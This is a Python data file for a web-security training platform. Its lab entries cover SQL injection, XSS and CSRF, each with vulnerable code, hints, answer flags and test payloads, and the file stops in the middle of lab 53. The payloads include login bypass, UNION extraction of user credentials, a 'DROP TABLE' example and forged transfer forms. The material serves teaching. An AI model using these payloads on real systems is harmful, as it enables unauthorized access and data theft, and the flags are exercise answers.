# Comprehensive labs database with 160 labs (20 per vulnerability type)
# Progressive difficulty, unique payloads, and detailed hints

LABS_DATABASE = [
    # ==================== SQL INJECTION (Labs 1-20) ====================
    {
        'id': 1,
        'title': 'SQL Injection - Basic Login Bypass',
        'category': 'sql_injection',
        'difficulty': 1,
        'points': 50,
        'description': 'Basic SQL injection to bypass login form using comment.',
        'scenario': 'The login form concatenates user input directly into SQL query.',
        'vulnerableCode': "SELECT * FROM users WHERE username='[username]' AND password='[password]'",
        'hint1': 'Try using SQL comment operators to ignore the password check.',
        'hint2': 'Username: admin, Password: anything (then use comments)',
        'hint3': 'Payload: admin\' -- or admin\' #',
        'flag': 'FLAG{sqli_bypass_001}',
        'testPayload': 'admin\' --'
    },
    {
        'id': 2,
        'title': 'SQL Injection - OR Condition',
        'category': 'sql_injection',
        'difficulty': 1,
        'points': 50,
        'description': 'Inject OR 1=1 to make query always true.',
        'scenario': 'Simple user authentication without input validation.',
        'vulnerableCode': "SELECT * FROM users WHERE username='[username]' AND password='[password]'",
        'hint1': 'Use OR conditions to make the WHERE clause always true.',
        'hint2': 'Think about making both username and password checks true.',
        'hint3': 'Try: username\' OR \'1\'=\'1 for both fields',
        'flag': 'FLAG{sqli_or_condition_002}',
        'testPayload': '\' OR \'1\'=\'1'
    },
    {
        'id': 3,
        'title': 'SQL Injection - UNION SELECT',
        'category': 'sql_injection',
        'difficulty': 2,
        'points': 75,
        'description': 'Use UNION to retrieve data from other tables.',
        'scenario': 'Search functionality vulnerable to SQL injection.',
        'vulnerableCode': "SELECT id, name FROM products WHERE name LIKE '%[search]%'",
        'hint1': 'UNION allows combining results from multiple SELECT statements.',
        'hint2': 'You need same number of columns in both SELECT statements.',
        'hint3': 'Try: search\' UNION SELECT username, password FROM users --',
        'flag': 'FLAG{sqli_union_003}',
        'testPayload': '\' UNION SELECT username, password FROM users --'
    },
    {
        'id': 4,
        'title': 'SQL Injection - UNION with NULL',
        'category': 'sql_injection',
        'difficulty': 2,
        'points': 75,
        'description': 'Use UNION with NULL to match column count.',
        'scenario': 'Product listing with search filter.',
        'vulnerableCode': "SELECT id, category FROM products WHERE category = '[category]'",
        'hint1': 'When column count is unknown, use NULL for extra columns.',
        'hint2': 'Try different numbers of NULL values.',
        'hint3': 'Payload: \' UNION SELECT NULL, table_name FROM information_schema.tables --',
        'flag': 'FLAG{sqli_union_null_004}',
        'testPayload': '\' UNION SELECT NULL, table_name FROM information_schema.tables --'
    },
    {
        'id': 5,
        'title': 'SQL Injection - Blind SQLi (Boolean)',
        'category': 'sql_injection',
        'difficulty': 3,
        'points': 100,
        'description': 'Extract data using boolean-based blind SQLi.',
        'scenario': 'Application only returns true/false, no error messages.',
        'vulnerableCode': 'SELECT COUNT(*) FROM users WHERE id = [user_id] AND status=1',
        'hint1': 'Use conditions that return true or false to extract data.',
        'hint2': 'Try: 1 AND (SELECT COUNT(*) FROM users)>0 --',
        'hint3': 'Binary search the database for specific values.',
        'flag': 'FLAG{sqli_blind_boolean_005}',
        'testPayload': '1 AND (SELECT COUNT(*) FROM users)>0 --'
    },
    {
        'id': 6,
        'title': 'SQL Injection - Time-Based Blind SQLi',
        'category': 'sql_injection',
        'difficulty': 3,
        'points': 100,
        'description': 'Extract data using time delays.',
        'scenario': 'Vulnerable search with delayed response.',
        'vulnerableCode': "SELECT * FROM users WHERE email LIKE '%[email]%'",
        'hint1': 'Use SLEEP() function to create delays.',
        'hint2': 'If condition is true, query sleeps; if false, returns quickly.',
        'hint3': 'Payload: \' OR SLEEP(5) --',
        'flag': 'FLAG{sqli_time_based_006}',
        'testPayload': '\' OR SLEEP(5) --'
    },
    {
        'id': 7,
        'title': 'SQL Injection - Stacked Queries',
        'category': 'sql_injection',
        'difficulty': 3,
        'points': 100,
        'description': 'Execute multiple SQL statements.',
        'scenario': 'Database driver supports stacked queries.',
        'vulnerableCode': 'SELECT * FROM products WHERE id = [id]',
        'hint1': 'Use semicolon to separate multiple SQL statements.',
        'hint2': 'First query can be anything, second query executes.',
        'hint3': 'Payload: 1; DROP TABLE logs; --',
        'flag': 'FLAG{sqli_stacked_007}',
        'testPayload': '1; SELECT * FROM users; --'
    },
    {
        'id': 8,
        'title': 'SQL Injection - Error-Based SQLi',
        'category': 'sql_injection',
        'difficulty': 2,
        'points': 75,
        'description': 'Extract data through error messages.',
        'scenario': 'Errors are displayed to users.',
        'vulnerableCode': 'SELECT * FROM users WHERE id = [id]',
        'hint1': 'Force database errors to leak information.',
        'hint2': 'Try: 1 AND extractvalue(1, concat(0x7e, (SELECT version())))',
        'hint3': 'XML functions in MySQL can leak data in errors.',
        'flag': 'FLAG{sqli_error_based_008}',
        'testPayload': '1 AND extractvalue(1, concat(0x7e, (SELECT version())))'
    },
    {
        'id': 9,
        'title': 'SQL Injection - Comment Bypassing',
        'category': 'sql_injection',
        'difficulty': 2,
        'points': 75,
        'description': 'Bypass filters using multiple comment styles.',
        'scenario': 'Filter blocks -- comment, but not others.',
        'vulnerableCode': "SELECT * FROM users WHERE name = '[name]'",
        'hint1': 'Different databases have different comment styles.',
        'hint2': 'MySQL: --, #, /* */; SQL Server: --, /* */',
        'hint3': 'Payload: admin\' #',
        'flag': 'FLAG{sqli_comment_bypass_009}',
        'testPayload': 'admin\' #'
    },
    {
        'id': 10,
        'title': 'SQL Injection - CASE Statement',
        'category': 'sql_injection',
        'difficulty': 3,
        'points': 100,
        'description': 'Use CASE WHEN for conditional queries.',
        'scenario': 'Blind SQLi without direct data output.',
        'vulnerableCode': 'SELECT COUNT(*) FROM orders WHERE user_id = [uid]',
        'hint1': 'CASE WHEN statements can be used for data extraction.',
        'hint2': 'True condition returns one value, false returns another.',
        'hint3': 'Payload: 1 UNION SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END',
        'flag': 'FLAG{sqli_case_statement_010}',
        'testPayload': '1 UNION SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END --'
    },
    {
        'id': 11,
        'title': 'SQL Injection - WHERE IN Clause',
        'category': 'sql_injection',
        'difficulty': 2,
        'points': 75,
        'description': 'Inject into WHERE IN clause.',
        'scenario': 'Filter by multiple IDs in list.',
        'vulnerableCode': "SELECT * FROM posts WHERE id IN ([ids])",
        'hint1': 'WHERE IN clause takes comma-separated values.',
        'hint2': 'You can close the list and add new conditions.',
        'hint3': 'Payload: 1,2,3) OR (1=1',
        'flag': 'FLAG{sqli_where_in_011}',
        'testPayload': '1,2,3) OR (1=1 --'
    },
    {
        'id': 12,
        'title': 'SQL Injection - UPDATE Statement',
        'category': 'sql_injection',
        'difficulty': 2,
        'points': 75,
        'description': 'Inject into UPDATE query.',
        'scenario': 'Profile update functionality.',
        'vulnerableCode': "UPDATE users SET email = '[email]' WHERE id = [uid]",
        'hint1': 'UPDATE statements can also be vulnerable.',
        'hint2': 'You can change unintended columns.',
        'hint3': 'Payload: test@site.com\' WHERE 1=1; --',
        'flag': 'FLAG{sqli_update_012}',
        'testPayload': 'test@site.com\' WHERE 1=1; --'
    },
    {
        'id': 13,
        'title': 'SQL Injection - ORDER BY Clause',
        'category': 'sql_injection',
        'difficulty': 2,
        'points': 75,
        'description': 'Inject into ORDER BY clause.',
        'scenario': 'Sorting functionality in search results.',
        'vulnerableCode': 'SELECT * FROM products ORDER BY [sort_field]',
        'hint1': 'ORDER BY takes column names or numbers.',
        'hint2': 'You can use it for blind SQLi detection.',
        'hint3': 'Payload: 1 OR SLEEP(5)',
        'flag': 'FLAG{sqli_order_by_013}',
        'testPayload': '1 OR SLEEP(5)'
    },
    {
        'id': 14,
        'title': 'SQL Injection - LIMIT Clause',
        'category': 'sql_injection',
        'difficulty': 2,
        'points': 75,
        'description': 'Inject into LIMIT clause.',
        'scenario': 'Pagination with user-controlled LIMIT.',
        'vulnerableCode': 'SELECT * FROM products LIMIT [limit]',
        'hint1': 'LIMIT takes number and offset.',
        'hint2': 'You can use it with UNION to execute other queries.',
        'hint3': 'Payload: 1 UNION SELECT version(), 2, 3, 4, 5 --',
        'flag': 'FLAG{sqli_limit_014}',
        'testPayload': '1 UNION SELECT version(), 2, 3, 4, 5 --'
    },
    {
        'id': 15,
        'title': 'SQL Injection - JOIN Clause',
        'category': 'sql_injection',
        'difficulty': 3,
        'points': 100,
        'description': 'Manipulate JOIN clause results.',
        'scenario': 'Complex query with multiple table joins.',
        'vulnerableCode': "SELECT * FROM users u JOIN orders o ON u.id = '[uid]'",
        'hint1': 'JOIN combines data from multiple tables.',
        'hint2': 'You can inject conditions into JOIN.',
        'hint3': 'Payload: 1\' OR \'1\'=\'1',
        'flag': 'FLAG{sqli_join_015}',
        'testPayload': '1\' OR \'1\'=\'1'
    },
    {
        'id': 16,
        'title': 'SQL Injection - GROUP BY Bypassing',
        'category': 'sql_injection',
        'difficulty': 3,
        'points': 100,
        'description': 'Bypass GROUP BY with HAVING clause.',
        'scenario': 'Aggregation query with filters.',
        'vulnerableCode': 'SELECT category FROM products GROUP BY category HAVING COUNT(*) > [count]',
        'hint1': 'HAVING clause filters grouped results.',
        'hint2': 'You can inject SQL into HAVING.',
        'hint3': 'Payload: 1 OR 1=1',
        'flag': 'FLAG{sqli_group_by_016}',
        'testPayload': '1 OR 1=1'
    },
    {
        'id': 17,
        'title': 'SQL Injection - Subquery Injection',
        'category': 'sql_injection',
        'difficulty': 3,
        'points': 100,
        'description': 'Inject into subquery.',
        'scenario': 'Nested SELECT statements.',
        'vulnerableCode': "SELECT * FROM (SELECT * FROM users WHERE id = [uid]) AS temp",
        'hint1': 'Subqueries can also be vulnerable.',
        'hint2': 'Close the subquery and inject at outer level.',
        'hint3': 'Payload: 1) UNION SELECT * FROM (SELECT 1,2,3,4,5)',
        'flag': 'FLAG{sqli_subquery_017}',
        'testPayload': '1) UNION SELECT * FROM (SELECT 1,2,3,4,5) --'
    },
    {
        'id': 18,
        'title': 'SQL Injection - Database Enumeration',
        'category': 'sql_injection',
        'difficulty': 3,
        'points': 100,
        'description': 'Extract database structure via SQLi.',
        'scenario': 'Reading information_schema tables.',
        'vulnerableCode': "SELECT * FROM posts WHERE author = '[author]'",
        'hint1': 'information_schema contains database structure.',
        'hint2': 'Query table_name, column_name from information_schema.',
        'hint3': 'Payload: \' UNION SELECT table_name FROM information_schema.tables --',
        'flag': 'FLAG{sqli_enum_018}',
        'testPayload': '\' UNION SELECT table_name FROM information_schema.tables --'
    },
    {
        'id': 19,
        'title': 'SQL Injection - String Concatenation',
        'category': 'sql_injection',
        'difficulty': 2,
        'points': 75,
        'description': 'Bypass using string concatenation bypass.',
        'scenario': 'Filter blocks certain keywords.',
        'vulnerableCode': "SELECT * FROM users WHERE status = '[status]'",
        'hint1': 'Some filters block spaces or keywords.',
        'hint2': 'Try: admin\'OR(1)--',
        'hint3': 'Remove spaces: admin\'OR/**/1--',
        'flag': 'FLAG{sqli_concat_019}',
        'testPayload': 'admin\'OR/**/1--'
    },
    {
        'id': 20,
        'title': 'SQL Injection - Arithmetic Operations',
        'category': 'sql_injection',
        'difficulty': 2,
        'points': 75,
        'description': 'Use arithmetic in blind SQLi.',
        'scenario': 'Numeric field vulnerable to injection.',
        'vulnerableCode': 'SELECT * FROM items WHERE price > [min_price]',
        'hint1': 'Numeric contexts need different payloads.',
        'hint2': 'Use arithmetic: 1+1, 1*1, 2-1 all equal 1.',
        'hint3': 'Payload: 0 OR 1=1',
        'flag': 'FLAG{sqli_arithmetic_020}',
        'testPayload': '0 OR 1=1'
    },

    # ==================== XSS - Cross Site Scripting (Labs 21-40) ====================
    {
        'id': 21,
        'title': 'XSS - Stored in Comment Field',
        'category': 'xss',
        'difficulty': 1,
        'points': 50,
        'description': 'Store JavaScript in comment section.',
        'scenario': 'Comment system saves input to database without escaping.',
        'vulnerableCode': 'db.insert("comments", {"text": comment}); // Later: {{ comment.text }}',
        'hint1': 'Try storing HTML and JavaScript in comments.',
        'hint2': 'Use <script> tags to execute code.',
        'hint3': 'Payload: <script>alert("XSS")</script>',
        'flag': 'FLAG{xss_stored_comment_021}',
        'testPayload': '<script>alert("XSS")</script>'
    },
    {
        'id': 22,
        'title': 'XSS - DOM-based in URL Parameter',
        'category': 'xss',
        'difficulty': 1,
        'points': 50,
        'description': 'XSS through URL parameter into DOM.',
        'scenario': 'Query parameter directly written to page.',
        'vulnerableCode': 'document.getElementById("output").innerHTML = getQueryParam("message")',
        'hint1': 'DOM-based XSS happens client-side.',
        'hint2': 'Inject HTML into innerHTML property.',
        'hint3': 'Payload: ?message=<img src=x onerror="alert(\'XSS\')">',
        'flag': 'FLAG{xss_dom_parameter_022}',
        'testPayload': '<img src=x onerror="alert(\'XSS\')">'
    },
    {
        'id': 23,
        'title': 'XSS - Event Handler Injection',
        'category': 'xss',
        'difficulty': 1,
        'points': 50,
        'description': 'Inject malicious event handlers.',
        'scenario': 'User-controlled attributes in HTML elements.',
        'vulnerableCode': '<img src="[image_url]">',
        'hint1': 'HTML event handlers like onerror, onload execute JavaScript.',
        'hint2': 'You can inject event handlers via img tag attributes.',
        'hint3': 'Payload: " onerror="alert(\'XSS\')" x="',
        'flag': 'FLAG{xss_event_handler_023}',
        'testPayload': '" onerror="alert(\'XSS\')" x="'
    },
    {
        'id': 24,
        'title': 'XSS - SVG Vector Attack',
        'category': 'xss',
        'difficulty': 2,
        'points': 75,
        'description': 'Execute XSS via SVG element.',
        'scenario': 'SVG uploads or embedded SVG.',
        'vulnerableCode': 'Upload SVG to server, serve as image',
        'hint1': 'SVG can contain script tags and event handlers.',
        'hint2': 'SVG files are XML-based and support JavaScript.',
        'hint3': 'Payload: <svg onload="alert(\'XSS\')"></svg>',
        'flag': 'FLAG{xss_svg_024}',
        'testPayload': '<svg onload="alert(\'XSS\')"></svg>'
    },
    {
        'id': 25,
        'title': 'XSS - Data URI Scheme',
        'category': 'xss',
        'difficulty': 2,
        'points': 75,
        'description': 'XSS via data: URI scheme.',
        'scenario': 'Link or iframe with data: URI.',
        'vulnerableCode': '<a href="[user_url]">Click</a>',
        'hint1': 'data: URI can embed HTML/JS directly.',
        'hint2': 'Browser interprets and executes content.',
        'hint3': 'Payload: data:text/html,<script>alert(\'XSS\')</script>',
        'flag': 'FLAG{xss_data_uri_025}',
        'testPayload': 'data:text/html,<script>alert(\'XSS\')</script>'
    },
    {
        'id': 26,
        'title': 'XSS - JavaScript Protocol',
        'category': 'xss',
        'difficulty': 1,
        'points': 50,
        'description': 'XSS via javascript: protocol in links.',
        'scenario': 'Unvalidated href attribute.',
        'vulnerableCode': '<a href="[link]">Link</a>',
        'hint1': 'javascript: protocol executes code instead of navigation.',
        'hint2': 'Used in href, onclick, and other attributes.',
        'hint3': 'Payload: javascript:alert(\'XSS\')',
        'flag': 'FLAG{xss_javascript_protocol_026}',
        'testPayload': 'javascript:alert(\'XSS\')'
    },
    {
        'id': 27,
        'title': 'XSS - Comment-Based Bypass',
        'category': 'xss',
        'difficulty': 2,
        'points': 75,
        'description': 'Use HTML comments to bypass filters.',
        'scenario': 'Filter blocks certain tags, but allows comments.',
        'vulnerableCode': 'Filter blocks <script>, but allows <img>',
        'hint1': 'HTML comments can hide payload from simple filters.',
        'hint2': 'Try using <!-- --> comments.',
        'hint3': 'Payload: <!--><script>alert(\'XSS\')</script>-->',
        'flag': 'FLAG{xss_comment_bypass_027}',
        'testPayload': '<!--><script>alert(\'XSS\')</script>-->'
    },
    {
        'id': 28,
        'title': 'XSS - Case Sensitivity Bypass',
        'category': 'xss',
        'difficulty': 1,
        'points': 50,
        'description': 'Bypass filter using different case.',
        'scenario': 'Filter blocks lowercase <script> but not uppercase.',
        'vulnerableCode': 'Filter checks for "<script>"',
        'hint1': 'Case-sensitive filters can be bypassed.',
        'hint2': 'HTML tags are case-insensitive.',
        'hint3': 'Payload: <ScRiPt>alert(\'XSS\')</ScRiPt>',
        'flag': 'FLAG{xss_case_bypass_028}',
        'testPayload': '<ScRiPt>alert(\'XSS\')</ScRiPt>'
    },
    {
        'id': 29,
        'title': 'XSS - Encoding Bypass',
        'category': 'xss',
        'difficulty': 2,
        'points': 75,
        'description': 'Use HTML encoding to bypass filters.',
        'scenario': 'Filter blocks certain characters in raw form.',
        'vulnerableCode': 'Filter checks raw string but not decoded',
        'hint1': 'URL encode or HTML encode to bypass.',
        'hint2': 'Common encodings: %3C for <, &#60; for <',
        'hint3': 'Payload: &#60;script&#62;alert(\'XSS\')&#60;/script&#62;',
        'flag': 'FLAG{xss_encoding_bypass_029}',
        'testPayload': '&#60;script&#62;alert(\'XSS\')&#60;/script&#62;'
    },
    {
        'id': 30,
        'title': 'XSS - Iframe Injection',
        'category': 'xss',
        'difficulty': 2,
        'points': 75,
        'description': 'Inject iframe with malicious source.',
        'scenario': 'User can embed iframes in content.',
        'vulnerableCode': '<iframe src="[iframe_src]"></iframe>',
        'hint1': 'Iframe can load external or data: URIs.',
        'hint2': 'Source attribute controls loaded content.',
        'hint3': 'Payload: " src="javascript:alert(\'XSS\')"',
        'flag': 'FLAG{xss_iframe_030}',
        'testPayload': '" src="javascript:alert(\'XSS\')"'
    },
    {
        'id': 31,
        'title': 'XSS - Style Attribute Attack',
        'category': 'xss',
        'difficulty': 2,
        'points': 75,
        'description': 'XSS via style attribute.',
        'scenario': 'User-controlled style attribute.',
        'vulnerableCode': '<div style="[user_style]"></div>',
        'hint1': 'CSS can execute behavior and scripts.',
        'hint2': 'expression() in IE, behavior: url() for imports.',
        'hint3': 'Payload: " style="background:url(javascript:alert(\'XSS\'));"',
        'flag': 'FLAG{xss_style_attribute_031}',
        'testPayload': '" style="background:url(javascript:alert(\'XSS\'));"'
    },
    {
        'id': 32,
        'title': 'XSS - Meta Refresh',
        'category': 'xss',
        'difficulty': 1,
        'points': 50,
        'description': 'XSS via meta refresh tag.',
        'scenario': 'User controls redirect URL.',
        'vulnerableCode': '<meta http-equiv="refresh" content="0; url=[url]">',
        'hint1': 'Meta refresh can use javascript: protocol.',
        'hint2': 'Browser redirects to and executes URL.',
        'hint3': 'Payload: javascript:alert(\'XSS\')',
        'flag': 'FLAG{xss_meta_refresh_032}',
        'testPayload': 'javascript:alert(\'XSS\')'
    },
    {
        'id': 33,
        'title': 'XSS - Form Action Attack',
        'category': 'xss',
        'difficulty': 1,
        'points': 50,
        'description': 'Modify form action to malicious endpoint.',
        'scenario': 'Form action attribute from user input.',
        'vulnerableCode': '<form action="[form_action]">',
        'hint1': 'Form action controls where form submits.',
        'hint2': 'Can use javascript: protocol.',
        'hint3': 'Payload: javascript:alert(\'XSS\')',
        'flag': 'FLAG{xss_form_action_033}',
        'testPayload': 'javascript:alert(\'XSS\')'
    },
    {
        'id': 34,
        'title': 'XSS - Audio/Video Tag',
        'category': 'xss',
        'difficulty': 1,
        'points': 50,
        'description': 'XSS via audio/video element events.',
        'scenario': 'User uploads media files or URLs.',
        'vulnerableCode': '<video src="[video_url]" onload="alert(\'XSS\')"></video>',
        'hint1': 'Media elements have event handlers like onload, onerror.',
        'hint2': 'Use malformed URL to trigger error handler.',
        'hint3': 'Payload: x" onerror="alert(\'XSS\')"',
        'flag': 'FLAG{xss_media_tag_034}',
        'testPayload': 'x" onerror="alert(\'XSS\')"'
    },
    {
        'id': 35,
        'title': 'XSS - Input Element Attack',
        'category': 'xss',
        'difficulty': 1,
        'points': 50,
        'description': 'XSS via input element attributes.',
        'scenario': 'Creating hidden or visible input fields.',
        'vulnerableCode': '<input type="text" value="[value]">',
        'hint1': 'Input elements can have event handlers.',
        'hint2': 'Use autofocus to trigger event automatically.',
        'hint3': 'Payload: " autofocus onfocus="alert(\'XSS\')',
        'flag': 'FLAG{xss_input_element_035}',
        'testPayload': '" autofocus onfocus="alert(\'XSS\')'
    },
    {
        'id': 36,
        'title': 'XSS - Mouse Event Handlers',
        'category': 'xss',
        'difficulty': 2,
        'points': 75,
        'description': 'XSS via mouse event handlers.',
        'scenario': 'User-controlled HTML with event handlers.',
        'vulnerableCode': '<span title="[tooltip]">Hover</span>',
        'hint1': 'Mouse events: onmouseover, onmouseout, onclick, etc.',
        'hint2': 'User doesn\'t need to interact if combined with autofocus.',
        'hint3': 'Payload: " onmouseover="alert(\'XSS\')"',
        'flag': 'FLAG{xss_mouse_event_036}',
        'testPayload': '" onmouseover="alert(\'XSS\')"'
    },
    {
        'id': 37,
        'title': 'XSS - Unicode Bypass',
        'category': 'xss',
        'difficulty': 2,
        'points': 75,
        'description': 'Use Unicode to bypass string filters.',
        'scenario': 'Filter blocks specific strings but not Unicode variants.',
        'vulnerableCode': 'Filter blocks "script" but not Unicode equivalents',
        'hint1': 'Unicode can represent same characters differently.',
        'hint2': 'Some filters don\'t normalize Unicode.',
        'hint3': 'Payload: \\u003cscript\\u003ealert(\'XSS\')\\u003c/script\\u003e',
        'flag': 'FLAG{xss_unicode_bypass_037}',
        'testPayload': '\\u003cscript\\u003ealert(\'XSS\')\\u003c/script\\u003e'
    },
    {
        'id': 38,
        'title': 'XSS - Double Encoding',
        'category': 'xss',
        'difficulty': 2,
        'points': 75,
        'description': 'Bypass filter with double encoding.',
        'scenario': 'Application decodes input twice.',
        'vulnerableCode': 'decoded = unescape(unescape(input))',
        'hint1': 'Encoding again can bypass single decode check.',
        'hint2': 'URL encode then HTML encode.',
        'hint3': 'Payload: %%33%%43script%%3E',
        'flag': 'FLAG{xss_double_encoding_038}',
        'testPayload': '%%33%%43script%%3E'
    },
    {
        'id': 39,
        'title': 'XSS - Label Element',
        'category': 'xss',
        'difficulty': 1,
        'points': 50,
        'description': 'XSS via label element with event handlers.',
        'scenario': 'Form label with user-controlled attributes.',
        'vulnerableCode': '<label for="[field_id]">Label</label>',
        'hint1': 'Label elements can have event handlers.',
        'hint2': 'Similar to other HTML elements.',
        'hint3': 'Payload: " onclick="alert(\'XSS\')"',
        'flag': 'FLAG{xss_label_element_039}',
        'testPayload': '" onclick="alert(\'XSS\')"'
    },
    {
        'id': 40,
        'title': 'XSS - Polyglot Payload',
        'category': 'xss',
        'difficulty': 3,
        'points': 100,
        'description': 'Payload works in multiple contexts.',
        'scenario': 'Filter tries to sanitize but incomplete.',
        'vulnerableCode': 'Stored and displayed in multiple contexts',
        'hint1': 'Polyglot payloads work in different output contexts.',
        'hint2': 'Combine HTML, JS, and event handlers.',
        'hint3': 'Payload: jaVasCript:/**/alert(\'XSS\')',
        'flag': 'FLAG{xss_polyglot_040}',
        'testPayload': 'jaVasCript:/**/alert(\'XSS\')'
    },

    # ==================== CSRF - Cross-Site Request Forgery (Labs 41-60) ====================
    {
        'id': 41,
        'title': 'CSRF - Form-Based State Change',
        'category': 'csrf',
        'difficulty': 1,
        'points': 50,
        'description': 'CSRF via hidden form auto-submission.',
        'scenario': 'Admin panel changes settings without CSRF token.',
        'vulnerableCode': '@app.route("/admin/settings", methods=["POST"])\ndef change_settings(): pass',
        'hint1': 'CSRF works when victim visits attacker page while logged in.',
        'hint2': 'Use HTML form with hidden fields and auto-submit.',
        'hint3': 'Payload: <form action="http://admin/settings" method="POST"><input name="setting" value="malicious"></form><script>document.forms[0].submit()</script>',
        'flag': 'FLAG{csrf_form_auto_041}',
        'testPayload': '<form action="http://admin/settings" method="POST"><input name="setting" value="malicious"></form><script>document.forms[0].submit()</script>'
    },
    {
        'id': 42,
        'title': 'CSRF - Image GET Request',
        'category': 'csrf',
        'difficulty': 1,
        'points': 50,
        'description': 'CSRF using img src for GET requests.',
        'scenario': 'State-changing GET request without CSRF protection.',
        'vulnerableCode': '@app.route("/user/settings", methods=["GET"])\ndef settings(): pass',
        'hint1': 'GET requests triggered by img tag src.',
        'hint2': 'Browsers auto-load img tags.',
        'hint3': 'Payload: <img src="http://target/user/settings?action=delete">',
        'flag': 'FLAG{csrf_image_get_042}',
        'testPayload': '<img src="http://target/user/settings?action=delete">'
    },
    {
        'id': 43,
        'title': 'CSRF - Link Attraction',
        'category': 'csrf',
        'difficulty': 1,
        'points': 50,
        'description': 'CSRF via attractive link victim clicks.',
        'scenario': 'User clicks link thinking it\'s legitimate.',
        'vulnerableCode': 'GET request changes state',
        'hint1': 'Disguise CSRF link as legitimate content.',
        'hint2': 'Use URL shortener or obfuscation.',
        'hint3': 'Payload: <a href="http://target/admin?id=1&action=delete">Click here</a>',
        'flag': 'FLAG{csrf_link_click_043}',
        'testPayload': '<a href="http://target/admin?id=1&action=delete">Click here</a>'
    },
    {
        'id': 44,
        'title': 'CSRF - Fetch API Request',
        'category': 'csrf',
        'difficulty': 2,
        'points': 75,
        'description': 'CSRF using Fetch API with credentials.',
        'scenario': 'Modern application using AJAX.',
        'vulnerableCode': 'fetch("/api/transfer", {method: "POST", body: data})',
        'hint1': 'Fetch API sends cookies automatically.',
        'hint2': 'Use credentials: "include" to ensure cookies sent.',
        'hint3': 'Payload: fetch("http://target/api/transfer", {method:"POST", credentials:"include", body:JSON.stringify({to:"attacker", amount:"999"})})',
        'flag': 'FLAG{csrf_fetch_api_044}',
        'testPayload': 'fetch("http://target/api/transfer", {method:"POST", credentials:"include"})'
    },
    {
        'id': 45,
        'title': 'CSRF - XMLHttpRequest (XHR)',
        'category': 'csrf',
        'difficulty': 2,
        'points': 75,
        'description': 'CSRF using XMLHttpRequest.',
        'scenario': 'Legacy AJAX implementation.',
        'vulnerableCode': 'var xhr = new XMLHttpRequest()',
        'hint1': 'XHR automatically includes credentials to same origin.',
        'hint2': 'Can make cross-origin requests if CORS allows.',
        'hint3': 'Payload: var xhr = new XMLHttpRequest(); xhr.open("POST", "http://target/api"); xhr.send()',
        'flag': 'FLAG{csrf_xhr_045}',
        'testPayload': 'var xhr = new XMLHttpRequest(); xhr.open("POST", "http://target/api"); xhr.send()'
    },
    {
        'id': 46,
        'title': 'CSRF - Subdomain Attack',
        'category': 'csrf',
        'difficulty': 2,
        'points': 75,
        'description': 'CSRF from attacker-controlled subdomain.',
        'scenario': 'Wildcard cookie affects subdomains.',
        'vulnerableCode': 'Cookie domain set to .target.com',
        'hint1': 'If cookie domain is .target.com, all subdomains share it.',
        'hint2': 'Attacker controls subdomain and sends CSRF request.',
        'hint3': 'Payload sent from evil.target.com to admin.target.com',
        'flag': 'FLAG{csrf_subdomain_046}',
        'testPayload': 'Request from subdomain'
    },
    {
        'id': 47,
        'title': 'CSRF - Cache Poisoning',
        'category': 'csrf',
        'difficulty': 3,
        'points': 100,
        'description': 'CSRF combined with cache poisoning.',
        'scenario': 'Cached page contains CSRF payload.',
        'vulnerableCode': 'GET request returns cached response with CSRF form',
        'hint1': 'Poisoned cache serves CSRF payload to all users.',
        'hint2': 'Combine with form auto-submission.',
        'hint3': 'Attacker crafts request that gets cached with CSRF payload.',
        'flag': 'FLAG{csrf_cache_poisoning_047}',
        'testPayload': 'Cache poisoning vector'
    },
    {
        'id': 48,
        'title': 'CSRF - Login CSRF',
        'category': 'csrf',
        'difficulty': 2,
        'points': 75,
        'description': 'CSRF on login functionality.',
        'scenario': 'Login process also vulnerable to CSRF.',
        'vulnerableCode': '@app.route("/login", methods=["POST"])',
        'hint1': 'Attacker logs victim into attacker\'s account.',
        'hint2': 'Victim then uses attacker\'s account unknowingly.',
        'hint3': 'Payload: <form method="POST" action="http://target/login"><input name="username" value="attacker"><input name="password" value="attacker123"></form>',
        'flag': 'FLAG{csrf_login_048}',
        'testPayload': '<form method="POST" action="http://target/login"><input name="username" value="attacker"></form>'
    },
    {
        'id': 49,
        'title': 'CSRF - JSON Content-Type',
        'category': 'csrf',
        'difficulty': 2,
        'points': 75,
        'description': 'CSRF with JSON content type.',
        'scenario': 'API accepts JSON but no CSRF protection.',
        'vulnerableCode': 'POST /api/users with Content-Type: application/json',
        'hint1': 'Simple forms can\'t send JSON directly.',
        'hint2': 'But Flash, plugins, or same-origin fetch can.',
        'hint3': 'Need SOP bypass to send JSON.',
        'flag': 'FLAG{csrf_json_content_049}',
        'testPayload': 'JSON CSRF attempt'
    },
    {
        'id': 50,
        'title': 'CSRF - Multi-Step Transaction',
        'category': 'csrf',
        'difficulty': 3,
        'points': 100,
        'description': 'CSRF on multi-step transaction.',
        'scenario': 'Only final step checked for CSRF token.',
        'vulnerableCode': 'Step 1,2 unprotected, step 3 has token',
        'hint1': 'Attack earlier steps to bypass later protection.',
        'hint2': 'Or combine multiple CSRF attacks sequentially.',
        'hint3': 'Payload: Series of CSRF requests for each step.',
        'flag': 'FLAG{csrf_multi_step_050}',
        'testPayload': 'Multi-step CSRF'
    },
    {
        'id': 51,
        'title': 'CSRF - Event Handler CSRF',
        'category': 'csrf',
        'difficulty': 1,
        'points': 50,
        'description': 'CSRF triggered by event handlers.',
        'scenario': 'Page uses onload or other events.',
        'vulnerableCode': '<body onload="sendRequest()">',
        'hint1': 'Use event handlers to automatically trigger requests.',
        'hint2': 'onload fires when page loads.',
        'hint3': 'Payload: <body onload="fetch(\'http://target/action\')">', 
        'flag': 'FLAG{csrf_event_handler_051}',
        'testPayload': '<body onload="fetch(\'http://target/action\')">'
    },
    {
        'id': 52,
        'title': 'CSRF - Iframe-Based',
        'category': 'csrf',
        'difficulty': 1,
        'points': 50,
        'description': 'CSRF payload in hidden iframe.',
        'scenario': 'User unaware of iframe content.',
        'vulnerableCode': '<iframe src="attacker-payload"></iframe>',
        'hint1': 'Iframe can load page that performs CSRF.',
        'hint2': 'Make iframe hidden or small.',
        'hint3': 'Payload: <iframe style="display:none" src="http://target/action?id=1"></iframe>',
        'flag': 'FLAG{csrf_iframe_052}',
        'testPayload': '<iframe style="display:none" src="http://target/action?id=1"></iframe>'
    },
    {
        'id': 53,
        'title': 'CSRF - Referrer-Policy Bypass',
        'category': 'csrf',
        'difficulty': 2,
        'points': 75,
        'description': 'Bypass referrer checks with policy.',
        'scenario': 'Application checks Referer header.',
        'vulnerableCode': 'if request.headers.get("Referer") != target_domain: return 401',
